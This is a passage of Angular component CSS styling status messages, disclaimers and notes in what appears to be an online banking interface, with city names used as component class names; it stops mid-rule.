        .canberra.large[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            width: 51px;
            height: 51px;
            display: block;
            text-align: center;
            border-radius: 50%;
            margin-right: 10px
        }

        .canberra.large[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] i[_ngcontent-c7] {
            display: block;
            padding-top: 16px;
            font-size: 18px;
            font-weight: 700 !important;
            opacity: .9
        }

        .canberra.large[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-top: 5px
        }

        .canberra.large[_ngcontent-c7] .canberra-text-title[_ngcontent-c7] {
            font-size: 18px
        }

        .canberra.large[_ngcontent-c7] .canberra-text-data-top[_ngcontent-c7] {
            font-size: 14px
        }

        .canberra[_ngcontent-c7] .canberra[_ngcontent-c7]>div[_ngcontent-c7]:last-child {
            width: calc(100% - 64px)
        }

        .canberra[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            min-height: 32px;
            color: #666
        }

        .canberra[_ngcontent-c7] .canberra-text-title[_ngcontent-c7] {
            font-size: 15px;
            white-space: normal
        }

        .productSelectorMessageMode[_ngcontent-c7] {
            margin: -2px -5px 5px
        }

        .productThirdPartySelectorMessageMode[_ngcontent-c7] {
            margin: 1px
        }

        .noteFullMode[_ngcontent-c7] {
            padding: 1px 1px 0
        }

        .noteFullMode[_ngcontent-c7] .canberra.canberra-note.canberra-disclaimer[_ngcontent-c7] {
            border: 1px solid #ffd512
        }

        .noteFullMode[_ngcontent-c7] .canberra.canberra-note.canberra-disclaimer[_ngcontent-c7] .canberra-note-triangle[_ngcontent-c7] {
            border-left-width: 16px;
            border-top-width: 16px
        }

        .noteFullMode[_ngcontent-c7] .canberra.canberra-note.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 0
        }

        .transferSetupMessageMode[_ngcontent-c7] {
            margin: -10px -20px 10px
        }

        .canberra-wrap-check[_ngcontent-c7] {
            border-radius: 50px;
            width: 53px;
            height: 53px;
            margin-right: 16px;
            display: table-cell;
            text-align: center;
            vertical-align: middle;
            float: none
        }

        .canberra[_ngcontent-c7]>div[_ngcontent-c7]:last-child {
            display: table-cell;
            vertical-align: middle
        }

        .canberra-wrap-check[_ngcontent-c7] i[_ngcontent-c7] {
            color: #fff;
            text-align: center;
            font-size: 20px;
            vertical-align: middle;
            height: 100%;
            display: table-cell
        }

        .canberra-text[_ngcontent-c7] {
            display: table;
            min-height: 54px
        }

        .canberra-text-title[_ngcontent-c7] {
            font-family: dinMedium;
            margin: 5px 0 10px;
            padding: 1px 0 0;
            font-size: 18px;
            display: table-cell;
            vertical-align: middle;
            width: 100%;
            font-weight: 400
        }

        .canberra-text-data-bottom[_ngcontent-c7],
        .canberra-text-data-top[_ngcontent-c7] {
            color: #666;
            display: table-row;
            white-space: normal;
            font-size: 13px
        }

        .canberra.canberra-success[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            background-color: #00a756
        }

        .canberra.canberra-success[_ngcontent-c7] h2.canberra-text-title[_ngcontent-c7] {
            color: #00a756
        }

        .canberra.canberra-warning[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            background-color: #f57c00
        }

        .canberra.canberra-warning[_ngcontent-c7] h2.canberra-text-title[_ngcontent-c7] {
            color: #f57c00
        }

        .canberra.canberra-error[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            background-color: #ec2e33
        }

        .canberra.canberra-error[_ngcontent-c7] h2.canberra-text-title[_ngcontent-c7] {
            color: #ec2e33
        }

        .canberra.canberra-information[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            background-color: #0097a7
        }

        .canberra.canberra-information[_ngcontent-c7] h2.canberra-text-title[_ngcontent-c7] {
            color: #12447f
        }

        .canberra.canberra-pending[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            background-color: #f57c00
        }

        .canberra.canberra-pending[_ngcontent-c7] h2.canberra-text-title[_ngcontent-c7] {
            color: #f57c00
        }

        .canberra.canberra-process[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            background-color: #f57c00
        }

        .canberra.canberra-process[_ngcontent-c7] h2.canberra-text-title[_ngcontent-c7] {
            color: #f57c00
        }

        .canberra.spotlight[_ngcontent-c7] {
            background: #f2f6f6
        }

        .canberra.no-icon[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] {
            display: none
        }

        .pendingApprovalMode.adaptableMode[_ngcontent-c7] {
            padding: 14px 18px 0
        }

        .canberra-text-data-bottom.no-show[_ngcontent-c7],
        .canberra-text-data-top.no-show[_ngcontent-c7],
        .canberra-text-title.no-show[_ngcontent-c7] {
            display: none
        }

        .messageTransferMode[_ngcontent-c7] {
            word-wrap: break-word;
            white-space: normal;
            margin: 0 -12px
        }

        .messageTransferMode[_ngcontent-c7] .canberra[_ngcontent-c7] {
            padding: 0 12px 2px
        }

        .messageTransferMode[_ngcontent-c7] .canberra[_ngcontent-c7]>div[_ngcontent-c7]:last-child {
            display: inline-block;
            width: 100%
        }

        .transactionsMode[_ngcontent-c7] {
            position: absolute;
            bottom: 0;
            width: 100%
        }

        .messageResultTransferMode[_ngcontent-c7] {
            margin-bottom: 20px
        }

        .messageResultTransferMode[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            display: block
        }

        .messageResultTransferMode[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-data-bottom[_ngcontent-c7],
        .messageResultTransferMode[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-data-top[_ngcontent-c7],
        .messageResultTransferMode[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-title[_ngcontent-c7] {
            display: block;
            margin: 0;
            word-break: break-word
        }

        .messageResultTransferMode[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-title[_ngcontent-c7] {
            line-height: 1.15
        }

        .messageResultTransferMode.messageInnerFullMode.adaptableMode[_ngcontent-c7] {
            height: auto;
            width: 100%
        }

        .thirdPartyProductAdministrationMode[_ngcontent-c7] {
            position: absolute;
            bottom: 42px;
            left: 0;
            right: 0
        }

        .cleanMode[_ngcontent-c7] .canberra-detail[_ngcontent-c7] {
            padding: 0
        }

        .canberra-border[_ngcontent-c7] {
            border: 1px solid transparent
        }

        .canberra-border.canberra-warning[_ngcontent-c7] {
            border-color: #ffd512
        }

        .canberra-border.canberra-warning.light[_ngcontent-c7] {
            border-color: #f2e9c0
        }

        .canberra-border.canberra-pending[_ngcontent-c7] {
            border-color: #ffd512
        }

        .canberra-border.canberra-pending.light[_ngcontent-c7] {
            border-color: #f2e9c0
        }

        .canberra-border.canberra-process[_ngcontent-c7] {
            border-color: #ffd512
        }

        .canberra-border.canberra-process.light[_ngcontent-c7] {
            border-color: #f2e9c0
        }

        .canberra-border.canberra-error[_ngcontent-c7] {
            border-color: #ec2e33
        }

        .canberra-border.canberra-error.light[_ngcontent-c7] {
            border-color: #fccfd0
        }

        .canberra-border.canberra-success[_ngcontent-c7] {
            border-color: #00a756
        }

        .canberra-border.canberra-success.light[_ngcontent-c7] {
            border-color: #d2e9de
        }

        .canberra-border.canberra-information[_ngcontent-c7] {
            border-color: #0097a7
        }

        .canberra-border.canberra-information.light[_ngcontent-c7] {
            border-color: #dde8ea
        }

        .canberra-note[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            margin: 0
        }

        .canberra-note[_ngcontent-c7] .canberra-note-triangle[_ngcontent-c7] {
            top: 0
        }

        .canberra-note[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            text-align: right
        }

        .canberra-note[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] {
            display: none
        }

        .canberra-note-triangle[_ngcontent-c7] {
            position: absolute;
            top: 2px;
            right: 0;
            width: 0;
            height: 0;
            border-left: 20px solid transparent
        }

        .canberra-note-triangle.canberra-pending[_ngcontent-c7],
        .canberra-note-triangle.canberra-process[_ngcontent-c7],
        .canberra-note-triangle.canberra-warning[_ngcontent-c7] {
            border-top: 20px solid #ffd512
        }

        .canberra-note-triangle.canberra-error[_ngcontent-c7] {
            border-top: 20px solid #ec2e33
        }

        .canberra-note-triangle.canberra-success[_ngcontent-c7] {
            border-top: 20px solid #00a756
        }

        .canberra-note-triangle.canberra-information[_ngcontent-c7] {
            border-top: 20px solid #0097a7
        }

        .canberra-background[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] {
            margin: 3px 0 3px 3px
        }

        .canberra-background.canberra-pending[_ngcontent-c7],
        .canberra-background.canberra-process[_ngcontent-c7],
        .canberra-background.canberra-warning[_ngcontent-c7] {
            background: #fef6d1
        }

        .canberra-background.canberra-error[_ngcontent-c7] {
            background: #fce3e4
        }

        .canberra-background.canberra-success[_ngcontent-c7] {
            background: #e6fff3
        }

        .canberra-background.canberra-information[_ngcontent-c7] {
            background: #edf8f9
        }

        .byScopeRowMode.widthFull[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: 100%;
            display: block;
            float: none
        }

        .byScopeRowMode[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: auto;
            float: right
        }

        .byScopeRowMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-right: 0
        }

        .byScopeRowMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 1px
        }

        .userAdministrationMode.widthFull[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: 100%;
            display: block;
            float: none
        }

        .userAdministrationMode[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: auto;
            float: right
        }

        .userAdministrationMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] {
            display: inline-block
        }

        .userAdministrationMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-right: 0
        }

        .userAdministrationMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 1px
        }

        .operationApprovalDisclaimerMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] {
            width: 100%
        }

        .operationApprovalDisclaimerMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-right: 0
        }

        .operationApprovalDisclaimerMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 1px
        }

        .personalSettingsMode[_ngcontent-c7] .canberra.canberra-disclaimer.medium[_ngcontent-c7] {
            padding: 3px 11px 5px
        }

        .permissionsConfigurationPageMode.widthFull[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: 100%;
            display: block;
            float: none
        }

        .permissionsConfigurationPageMode[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: auto;
            float: right
        }

        .permissionsConfigurationPageMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] {
            display: inline-block
        }

        .permissionsConfigurationPageMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-right: 0
        }

        .permissionsConfigurationPageMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 1px
        }

        .messaggeFooterMode[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: 100%
        }

        .messaggeFooterMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] {
            display: inline-block
        }

        .messaggeFooterMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-right: 0
        }

        .messaggeFooterMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 1px
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] {
            display: table
        }

        .canberra.canberra-disclaimer.medium[_ngcontent-c7] {
            padding: 0 8px 3px
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] {
            background: 0 0;
            border-radius: 0
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] i[_ngcontent-c7] {
            font-size: 16px !important
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-right: 20px;
            min-height: 20px
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            font-size: 12px;
            padding: 2px 5px 0;
            line-height: 1.3
        }

        .canberra.canberra-disclaimer.canberra-warning[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] {
            background: 0 0
        }

        .canberra.canberra-disclaimer.canberra-warning[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] i[_ngcontent-c7] {
            color: #f57c00
        }

        .canberra.canberra-disclaimer.canberra-pending[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] {
            background: 0 0
        }

        .canberra.canberra-disclaimer.canberra-pending[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] i[_ngcontent-c7] {
            color: #f57c00
        }

        .canberra.canberra-disclaimer.canberra-process[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] {
            background: 0 0
        }

        .canberra.canberra-disclaimer.canberra-process[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] i[_ngcontent-c7] {
            color: #f57c00
        }

        .canberra.canberra-disclaimer.canberra-error[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] {
            background: 0 0
        }

        .canberra.canberra-disclaimer.canberra-error[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] i[_ngcontent-c7] {
            color: #ec2e33
        }

        .canberra.canberra-disclaimer.canberra-success[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] {
            background: 0 0
        }

        .canberra.canberra-disclaimer.canberra-success[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] i[_ngcontent-c7] {
            color: #00a756
        }

        .canberra.canberra-disclaimer.canberra-information[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] {
            background: 0 0
        }

        .canberra.canberra-disclaimer.canberra-information[_ngcontent-c7] .canberra-wrap-icon[_ngcontent-c7] i[_ngcontent-c7] {
            color: #12447f
        }

        .canberra.canberra-disclaimer.canberra-information[_ngcontent-c7] .canberra-detail[_ngcontent-c7] {
            border-color: #12447f
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-button[_ngcontent-c7] {
            top: 7px
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-button[_ngcontent-c7] i[_ngcontent-c7] {
            font-size: 10px
        }

        .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-wrap-check.canberra-wrap-icon[_ngcontent-c7] {
            height: 24px;
            width: 22px;
            vertical-align: top;
            padding-top: 5px
        }

        .canberra.canberra-disclaimer.no-icon[_ngcontent-c7] .canberra-button[_ngcontent-c7] {
            top: 5px
        }

        .canberra-button[_ngcontent-c7] {
            font-size: 12px;
            cursor: pointer;
            color: #333;
            position: absolute;
            display: inline-table;
            top: 0;
            right: 10px;
            width: auto;
            margin: auto 0;
            line-height: 1
        }

        .canberra-text-resource[_ngcontent-c7] {
            color: #666;
            font-size: 14px;
            display: table-cell;
            vertical-align: middle;
            word-wrap: break-word;
            padding: 3px;
            white-space: normal
        }

        .canberra-detail[_ngcontent-c7] {
            width: 100%;
            padding: 5px;
            border-left-width: 1px;
            border-right-width: 1px;
            border-bottom-width: 1px;
            border-left-style: solid;
            border-right-style: solid;
            border-bottom-style: solid;
            display: none;
            opacity: 0;
            -webkit-animation: .6s fadeOut;
            animation: .6s fadeOut
        }

        .canberra-detail.canberra-pending[_ngcontent-c7],
        .canberra-detail.canberra-process[_ngcontent-c7],
        .canberra-detail.canberra-warning[_ngcontent-c7] {
            background: #fffbeb;
            border-color: #ffd512
        }

        .canberra-detail.canberra-error[_ngcontent-c7] {
            background: #fdf1f1;
            border-color: #ec2e33
        }

        .canberra-detail.canberra-success[_ngcontent-c7] {
            background: #f5fffa;
            border-color: #00a756
        }

        .canberra-detail.canberra-information[_ngcontent-c7] {
            background: #f8fcfd;
            border-color: #12447f
        }

        .canberra-detail.show[_ngcontent-c7] {
            -webkit-animation: .6s fadeIn;
            animation: .6s fadeIn;
            display: block;
            opacity: 1
        }

        .canberra-detail.show[_ngcontent-c7] .canberra_detail_button[_ngcontent-c7] {
            -webkit-animation: .6s fadeIn;
            animation: .6s fadeIn;
            display: inline-block;
            opacity: 1
        }

        .canberra_detail_button[_ngcontent-c7] {
            min-height: 20px
        }

        .canberra_detail_button[_ngcontent-c7] .canberra_detail_button_text[_ngcontent-c7] {
            font-size: 12px;
            cursor: pointer;
            color: #ec2e33;
            vertical-align: middle;
            padding: 2px 5px 0;
            display: none;
            opacity: 0;
            -webkit-animation: .15s fadeOut;
            animation: .15s fadeOut
        }

        .canberra_detail_button[_ngcontent-c7] .canberra_detail_button_text.show[_ngcontent-c7] {
            -webkit-animation: .15s fadeIn;
            animation: .15s fadeIn;
            display: table-cell;
            opacity: 1
        }

        .light[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            color: #8a8a8a
        }

        .creditCardPaymentProductMode[_ngcontent-c7],
        .creditPaymentDetailMode[_ngcontent-c7],
        .salaryPaymentMode[_ngcontent-c7] {
            margin-top: -6px
        }

        .cleanMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7],
        .creditCardPaymentProductMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 1px
        }

        .paymentNextPaymentsPageMode[_ngcontent-c7] {
            margin: 28px 20px
        }

        .hobart[_ngcontent-c7] .hobart-line-separator[_ngcontent-c7] {
            height: 1px;
            width: 100%;
            background: #e1e1e1;
            margin: 20px 0
        }

        .hobart[_ngcontent-c7] .hobart-icon[_ngcontent-c7] {
            display: inline-block;
            vertical-align: top;
            font-size: 16px;
            color: #666
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] {
            display: inline-block;
            width: 100%;
            padding: 0 6px;
            vertical-align: top
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-header[_ngcontent-c7] .hobart-header-title[_ngcontent-c7] {
            display: block;
            padding-bottom: 10px;
            font-size: 12px;
            color: #666;
            white-space: normal
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] {
            white-space: normal
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-content-text[_ngcontent-c7] {
            display: block;
            padding-bottom: 6px;
            font-size: 14px;
            line-height: normal;
            color: #666
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-content-text.sub-paragraph[_ngcontent-c7] {
            display: inline-block;
            vertical-align: top
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-less[_ngcontent-c7],
        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-more[_ngcontent-c7] {
            display: inline-block;
            padding-bottom: 6px;
            font-size: 14px;
            line-height: normal;
            color: #0097c1;
            cursor: pointer
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-less[_ngcontent-c7]:first-letter,
        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-more[_ngcontent-c7]:first-letter {
            text-transform: uppercase
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-less[_ngcontent-c7]:hover,
        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-more[_ngcontent-c7]:hover {
            color: #005b75
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content.all-items[_ngcontent-c7] .hobart-content-text.sub-paragraph.first-sub[_ngcontent-c7] {
            display: none
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content.all-items[_ngcontent-c7] .sub-paragraph[_ngcontent-c7]~.hobart-content-text[_ngcontent-c7] {
            opacity: 1;
            -webkit-animation: .6s fadeIn;
            animation: .6s fadeIn
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content.some-items[_ngcontent-c7] .hobart-content-text.sub-paragraph.first-sub[_ngcontent-c7] .hobart-sub-text[_ngcontent-c7]:after {
            content: '...';
            display: inline-block
        }

        .hobart[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content.some-items[_ngcontent-c7] .sub-paragraph[_ngcontent-c7]~.hobart-content-text[_ngcontent-c7] {
            display: none
        }

        .hobart[_ngcontent-c7] .hobart-icon[_ngcontent-c7]+.hobart-main[_ngcontent-c7] {
            padding-left: 3px;
            max-width: calc(100% - 20px)
        }

        .hobart[_ngcontent-c7] .hobart-icon[_ngcontent-c7]+.hobart-main[_ngcontent-c7] .hobart-header[_ngcontent-c7] .hobart-header-title[_ngcontent-c7] {
            padding-top: 2px;
            padding-bottom: 6px
        }

        .hobart[_ngcontent-c7] .hobart-icon[_ngcontent-c7]+.hobart-main[_ngcontent-c7] .hobart-header[_ngcontent-c7]+.hobart-content[_ngcontent-c7] {
            margin-left: -20px
        }

        .hobart.canberra-pending[_ngcontent-c7] i[_ngcontent-c7],
        .hobart.canberra-process[_ngcontent-c7] i[_ngcontent-c7],
        .hobart.canberra-warning[_ngcontent-c7] i[_ngcontent-c7] {
            color: #f57c00
        }

        .hobart.canberra-error[_ngcontent-c7] i[_ngcontent-c7] {
            color: #ec2e33
        }

        .hobart.canberra-success[_ngcontent-c7] i[_ngcontent-c7] {
            color: #00a756
        }

        .hobart.canberra-information[_ngcontent-c7] i[_ngcontent-c7] {
            color: #0097a7
        }

        .hobart.HighlightDisplay[_ngcontent-c7] {
            padding: 6px 6px 3px
        }

        .hobart.HighlightDisplay[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-content-text[_ngcontent-c7] {
            font-size: 12px
        }

        .hobart.HighlightDisplay[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-more[_ngcontent-c7] {
            padding: 0;
            font-size: 12px
        }

        .hobart.HighlightDisplay[_ngcontent-c7] .hobart-main[_ngcontent-c7] .hobart-content[_ngcontent-c7] .hobart-show-less[_ngcontent-c7] {
            display: block;
            font-size: 12px
        }

        .hobart.HighlightDisplay.canberra-pending[_ngcontent-c7],
        .hobart.HighlightDisplay.canberra-process[_ngcontent-c7],
        .hobart.HighlightDisplay.canberra-warning[_ngcontent-c7] {
            background: #fef6d1;
            border: 1px solid #f2e9c0
        }

        .hobart.HighlightDisplay.canberra-error[_ngcontent-c7] {
            background: #fce3e4;
            border: 1px solid #fccfd0
        }

        .hobart.HighlightDisplay.canberra-success[_ngcontent-c7] {
            background: #e6fff3;
            border: 1px solid #d2e9de
        }

        .hobart.HighlightDisplay.canberra-information[_ngcontent-c7] {
            background: #edf8f9;
            border: 1px solid #dde8ea
        }

        .hobart.HighlightDisplay[_ngcontent-c7] .hobart-line-separator[_ngcontent-c7] {
            display: none
        }

        .canberra.large.canberra-process[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] i[_ngcontent-c7] {
            font-size: 26px;
            padding-top: 13px
        }

        .canberra.large.canberra-pending[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] i[_ngcontent-c7] {
            font-size: 22px;
            padding-top: 14px;
            padding-left: 3px
        }

        .titleBold[_ngcontent-c7] {
            font-size: 14px;
            font-family: dinMedium
        }

        @media (max-width:1199px) and (min-width:1024px) {
            .adaptableMode[_ngcontent-c7] {
                height: 200px;
                width: 50%
            }
        }

        @media only screen and (min-width:1024px) {
            .messageResultTransferMode[_ngcontent-c7] {
                margin-left: 7px;
                margin-top: 5px
            }
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .messageTransferMode[_ngcontent-c7] {
                margin: 6px -12px 0
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .canberra[_ngcontent-c7] {
                padding-left: 0
            }

            .canberra-wrap-check[_ngcontent-c7] {
                width: 40px;
                height: 40px
            }

            .canberra-wrap-check[_ngcontent-c7] i[_ngcontent-c7] {
                font-size: 16px
            }

            .canberra[_ngcontent-c7]>div[_ngcontent-c7]:last-child {
                width: calc(100% - 72px)
            }

            .canberra-text[_ngcontent-c7] {
                min-height: 40px
            }

            .canberra-text-title[_ngcontent-c7] {
                font-size: 16px;
                font-family: dinRegular
            }

            .canberra-text-data-bottom[_ngcontent-c7],
            .canberra-text-data-top[_ngcontent-c7] {
                font-size: 12px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .canberra[_ngcontent-c7] {
                padding-left: 0
            }

            .canberra-wrap-check[_ngcontent-c7] {
                width: 40px;
                height: 40px;
                margin-right: 12px
            }

            .canberra-wrap-check[_ngcontent-c7] i[_ngcontent-c7] {
                font-size: 16px
            }

            .canberra[_ngcontent-c7]>div[_ngcontent-c7]:last-child {
                width: calc(100% - 72px)
            }

            .canberra-text[_ngcontent-c7] {
                min-height: 40px
            }

            .canberra-text-title[_ngcontent-c7] {
                font-size: 16px;
                font-family: dinRegular
            }

            .canberra-text-data-bottom[_ngcontent-c7],
            .canberra-text-data-top[_ngcontent-c7] {
                font-size: 12px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .messageResultTransferMode[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-title[_ngcontent-c7] {
                margin-bottom: 6px
            }
        }

        .backoffice [_nghost-c7] .padding-30[_ngcontent-c7] {
            padding: 10px
        }

        .backoffice [_nghost-c7] .noPaddingLRMode[_ngcontent-c7] .padding-30[_ngcontent-c7] {
            padding: 0 0 6px
        }

        .backoffice [_nghost-c7] .requestOperatorMessageMode[_ngcontent-c7] {
            padding-bottom: 25px
        }

        .backoffice [_nghost-c7] .requestOperatorMessageMode.widthFull[_ngcontent-c7] .canberra[_ngcontent-c7] {
            width: 100%;
            display: block;
            float: none
        }

        .backoffice [_nghost-c7] .requestOperatorMessageMode[_ngcontent-c7] .canberra[_ngcontent-c7] {
            float: right
        }

        .backoffice [_nghost-c7] .requestOperatorMessageMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            padding-right: 0
        }

        .backoffice [_nghost-c7] .requestOperatorMessageMode[_ngcontent-c7] .canberra.canberra-disclaimer[_ngcontent-c7] .canberra-text[_ngcontent-c7] .canberra-text-resource[_ngcontent-c7] {
            padding-left: 1px
        }

        .canberra.large[_ngcontent-c7] .canberra-text-title[_ngcontent-c7] {
            display: table-row
        }

        .messageResultTransferMode.adaptableMode[_ngcontent-c7] .canberra.large[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] {
            vertical-align: top
        }

        .paymentResultMessageMode.messageResultTransferMode[_ngcontent-c7] {
            margin-bottom: 0
        }

        .trasferSetupExchangeMode[_ngcontent-c7] .canberra.canberra-border.light[_ngcontent-c7] {
            border-top: 1px solid transparent
        }
    </style>
<style>
        .watford[_ngcontent-c2] {
            width: 100%;
            height: 200px;
            background: #12447f;
            position: relative;
            padding-top: 12px;
            -webkit-animation: .25s watford-animated-init;
            animation: .25s watford-animated-init;
            opacity: 1
        }

        @-webkit-keyframes watford-animated-init {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes watford-animated-init {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @media only screen and (-webkit-min-device-pixel-ratio:2) and (-webkit-min-device-pixel-ratio:2),
        only screen and (-webkit-min-device-pixel-ratio:2) and (min-resolution:192dpi) {
            .exeter[_ngcontent-c2] {
